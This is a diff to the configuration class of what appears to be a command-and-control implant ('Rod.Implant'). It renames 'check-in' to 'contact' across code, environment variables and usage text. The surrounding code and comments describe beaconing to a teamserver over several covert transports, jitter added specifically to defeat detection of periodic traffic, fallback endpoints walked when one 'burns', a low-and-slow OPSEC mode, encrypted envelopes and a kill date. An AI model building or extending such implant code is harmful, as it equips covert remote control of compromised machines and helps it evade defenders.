@@ -11,7 +11,7 @@ namespace Rod.Implant.Internal;
 /// Everything the reference implant needs to enroll and beacon. Mirrors the Go
 /// implant's config.Config: <see cref="EnrollURL"/> and <see cref="BeaconURL"/>
 /// are the teamserver endpoints, <see cref="StagerToken"/> redeems at enroll,
-/// sleep/jitter drive the check-in cadence, and <see cref="KillDate"/> is the
+/// sleep/jitter drive the contact cadence, and <see cref="KillDate"/> is the
 /// hard self-termination timestamp.
 /// </summary>
 internal sealed class Config
@@ -24,9 +24,9 @@ internal sealed class Config
     public string EnrollURL { get; set; } = string.Empty;
 
     /// <summary>
-    /// The check-in endpoint. A bare host:port names the mTLS socket the gRPC
-    /// Beacon.CheckIn stream dials; an http(s) URL names the web front whose
-    /// envelope POST cycle (/implants/beacon) carries the check-in
+    /// The contact endpoint. A bare host:port names the mTLS socket the gRPC
+    /// Beacon.Contact stream dials; an http(s) URL names the web front whose
+    /// envelope POST cycle (/implants/beacon) carries the contact
     /// (architecture.md Sec 8). When empty it is derived from
     /// <see cref="EnrollURL"/> -- an http(s) front derives its own web URL, an
     /// mTLS front its bare host. It pairs with the primary endpoint only; every
@@ -37,7 +37,7 @@ internal sealed class Config
     /// <summary>
     /// The ordered fallback enroll endpoints baked in behind
     /// <see cref="EnrollURL"/> (architecture.md Sec 8): when the primary burns,
-    /// the implant walks this list on failed check-ins instead of going silent.
+    /// the implant walks this list on failed contacts instead of going silent.
     /// Each entry is another front to the same teamserver, so the enrolled leaf
     /// -- the identity the listener sees -- never changes across the walk. Empty
     /// is the single-endpoint shape.
@@ -48,8 +48,8 @@ internal sealed class Config
     public string StagerToken { get; set; } = string.Empty;
 
     /// <summary>
-    /// The base interval between check-ins. Jitter is applied on top to avoid
-    /// periodic-check-in detection (architecture.md Sec 7).
+    /// The base interval between contacts. Jitter is applied on top to avoid
+    /// periodic-contact detection (architecture.md Sec 7).
     /// </summary>
     public TimeSpan Sleep { get; set; } = TimeSpan.FromSeconds(30);
 
@@ -83,7 +83,7 @@ internal sealed class Config
     public TransportProfile Transport { get; set; } = new();
 
     /// <summary>
-    /// How one check-in cycle uses the beacon stream: "stream" holds the
+    /// How one contact cycle uses the beacon stream: "stream" holds the
     /// connection open (interactive, server-push tasking); "poll" drains queued
     /// tasking, closes, and sleeps the interval -- the low-and-slow OPSEC shape
     /// (architecture.md Sec 7). Baked at build time; flag/env override.
@@ -120,7 +120,7 @@ internal sealed class Config
     /// route -- whichever entry of the egress walk is current. A quic-,
     /// socket-, or dns-schemed entry rides exactly as baked: each is its own
     /// exchange's dial (architecture.md Sec 8 -- enrollment over QUIC, the
-    /// stream check-in, and the DNS grammar, where the path IS the zone), and
+    /// stream contact, and the DNS grammar, where the path IS the zone), and
     /// the profile's HTTP knobs apply to no part of it.
     /// </summary>
     public static string ResolveEnrollUrl(string enrollUrl, TransportProfile transport)
@@ -182,7 +182,7 @@ internal sealed class Config
                 UserAgent = Env("ROD_USER_AGENT", string.Empty),
                 Envelope = Env("ROD_ENVELOPE", string.Empty),
                 EnvelopeKey = Env("ROD_ENVELOPE_KEY", string.Empty),
-                CheckInEnvelope = Env("ROD_CHECKIN_ENVELOPE", string.Empty),
+                ContactEnvelope = Env("ROD_CONTACT_ENVELOPE", string.Empty),
                 RequestTimeout = EnvTimeSpan("ROD_REQUEST_TIMEOUT", TimeSpan.Zero),
                 Headers = ParseHeadersEnv(Env("ROD_HEADERS", string.Empty)),
             },
@@ -288,7 +288,7 @@ internal sealed class Config
         usage: rod-implant [flags]
 
           -enroll-url string   teamserver enroll endpoint (https://host:port/implants/enroll)
-          -beacon-url string   check-in endpoint: host:port dials the mTLS gRPC stream,
+          -beacon-url string   contact endpoint: host:port dials the mTLS gRPC stream,
                                http(s):// dials the envelope POST cycle (empty = derive
                                from the enroll endpoint)
           -fallback-enroll-urls strings
@@ -297,7 +297,7 @@ internal sealed class Config
           -token string        stager token secret redeeming at enroll
           -sleep duration      beacon sleep interval (default 30s)
           -jitter duration     beacon jitter interval (default 10s)
-          -mode string         check-in mode: stream (persistent) or poll (default stream)
+          -mode string         contact mode: stream (persistent) or poll (default stream)
           -kill-date string    RFC3339 kill date past which the implant exits
           -ca-cert string      optional PEM file pinning the teamserver CA to trust
           -enroll-path string  transport profile: the URI path enroll posts to
@@ -313,10 +313,10 @@ internal sealed class Config
         ROD_STAGER_TOKEN, ROD_SLEEP, ROD_JITTER, ROD_MODE, ROD_KILL_DATE,
         ROD_CA_CERT, ROD_ENROLL_PATH, ROD_USER_AGENT, ROD_HEADERS as JSON,
         ROD_ENVELOPE, ROD_REQUEST_TIMEOUT, ROD_VERBS, ROD_QUIET, ROD_ENVELOPE_KEY,
-        ROD_CHECKIN_ENVELOPE, ROD_SHELL_IDLE_SECONDS).
+        ROD_CONTACT_ENVELOPE, ROD_SHELL_IDLE_SECONDS).
         """;
 
-    // Validates the check-in mode; anything but stream/poll is a usage error
+    // Validates the contact mode; anything but stream/poll is a usage error
     // rather than a silent default, so a typoed bake or flag fails loudly.
     private static string NormalizeMode(string value)
     {
@@ -518,7 +518,7 @@ internal sealed class Config
     }
 }
 
-/// <summary>The two check-in modes a beacon can run (see Config.Mode).</summary>
+/// <summary>The two contact modes a beacon can run (see Config.Mode).</summary>
 internal static class BeaconModes
 {
     public const string Stream = "stream";
@@ -567,18 +567,18 @@ internal sealed class TransportProfile
 
     /// <summary>The AES-GCM envelope's baked key material, standard base64 of
     /// keyId(16) || key(32). Seals the enroll body under the "aesgcm"
-    /// envelope and every check-in body under "aesgcm" check-in protection;
+    /// envelope and every contact body under "aesgcm" contact protection;
     /// the bake (or ROD_ENVELOPE_KEY) fills it.</summary>
     public string EnvelopeKey { get; set; } = string.Empty;
 
-    /// <summary>How the envelope check-in bodies are protected
+    /// <summary>How the envelope contact bodies are protected
     /// (architecture.md Sec 8): "aesgcm" seals every POST and its response
     /// under the baked envelope key, covering a fresh counter -- the
     /// application-layer authentication the web transports use instead of a
     /// TLS client certificate; "none" (or empty) sends the plaintext framed
-    /// body, the lab-debug shape. The bake (or ROD_CHECKIN_ENVELOPE) fills
+    /// body, the lab-debug shape. The bake (or ROD_CONTACT_ENVELOPE) fills
     /// it; builds default it on.</summary>
-    public string CheckInEnvelope { get; set; } = string.Empty;
+    public string ContactEnvelope { get; set; } = string.Empty;
 
     /// <summary>True when the envelope wraps the enroll body as base64.</summary>
     public bool IsBase64Envelope =>
@@ -591,12 +591,12 @@ internal sealed class TransportProfile
         Envelope.Equals("aesgcm", StringComparison.OrdinalIgnoreCase)
         && EnvelopeKey.Length > 0;
 
-    /// <summary>True when the check-in bodies seal under the baked key: the
+    /// <summary>True when the contact bodies seal under the baked key: the
     /// shape and the key must both be present, exactly the enroll envelope's
     /// rule -- a build that asked for sealing without a key falls back to the
-    /// plaintext frame rather than checking in undecodably.</summary>
-    public bool SealsCheckIns =>
-        CheckInEnvelope.Equals("aesgcm", StringComparison.OrdinalIgnoreCase)
+    /// plaintext frame rather than contacting undecodably.</summary>
+    public bool SealsContacts =>
+        ContactEnvelope.Equals("aesgcm", StringComparison.OrdinalIgnoreCase)
         && EnvelopeKey.Length > 0;
 }
 
